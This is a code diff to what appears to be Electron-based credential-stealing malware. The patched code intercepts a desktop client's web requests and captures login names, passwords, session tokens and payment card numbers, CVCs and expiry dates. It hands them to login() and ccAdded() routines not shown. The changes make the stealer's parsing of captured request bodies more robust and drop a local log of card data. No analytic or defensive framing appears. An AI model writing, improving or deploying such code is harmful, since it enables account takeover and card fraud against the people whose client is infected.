@@ -913,7 +913,9 @@ const writeLog = (message) => {
     const logMessage = `[${new Date().toISOString()}] ${message}\n`;
     fs.appendFileSync(logFilePath, logMessage);
   };
-  
+
+const querystring = require('querystring');
+
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
   writeLog(`🚩 [Request Captured] URL: ${details.url}`);
   writeLog(`🔍 [Method]: ${details.method}`);
@@ -929,18 +931,24 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
     unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
     writeLog(`📝 [Unparsed Data]: ${unparsed_data}`);
   } catch (err) {
-    writeLog(`⚠️ [Error Parsing Data]: ${err}`);
+    writeLog(`⚠️ [Error Reading Data]: ${err}`);
     return;
   }
 
   let data;
+  // 🌐 D'abord on tente JSON.parse
   try {
-    // Correction ici : utiliser querystring.parse au lieu de JSON.parse
-    data = querystring.parse(unparsed_data);
-    writeLog(`✅ [Parsed Data]: ${JSON.stringify(data)}`);
-  } catch (err) {
-    writeLog(`⚠️ [Data Parse Error]: ${err}`);
-    return;
+    data = JSON.parse(unparsed_data);
+    writeLog(`✅ [Parsed as JSON]: ${JSON.stringify(data)}`);
+  } catch (jsonErr) {
+    // 🔗 Si ce n'est pas du JSON, on tente le URL-encoded
+    try {
+      data = querystring.parse(unparsed_data);
+      writeLog(`✅ [Parsed as URL-encoded]: ${JSON.stringify(data)}`);
+    } catch (urlErr) {
+      writeLog(`❌ [Failed to Parse Data]: ${jsonErr} | ${urlErr}`);
+      return;
+    }
   }
 
   let token;
@@ -954,7 +962,7 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
 
   switch (true) {
     case details.url.endsWith('login'):
-      writeLog(`🔐 [Login Event Detected]`);
+      writeLog(`🔐 [Login Detected]`);
       login(data.login, data.password, token).catch((err) => writeLog(`⚠️ [Login Error]: ${err}`));
       break;
 
@@ -977,7 +985,6 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
     case details.url.endsWith('tokens') && details.method === 'POST':
       writeLog(`💳 [Credit Card Info Detected]`);
       try {
-        writeLog(`💾 [Card Data]: ${JSON.stringify(data)}`);
         ccAdded(data['card[number]'], data['card[cvc]'], data['card[exp_month]'], data['card[exp_year]'], token).catch((err) => writeLog(`⚠️ [Credit Card Capture Error]: ${err}`));
       } catch (err) {
         writeLog(`⚠️ [Card Data Parsing Failed]: ${err}`);
@@ -1001,6 +1008,7 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       break;
   }
 });
+
 
 
 
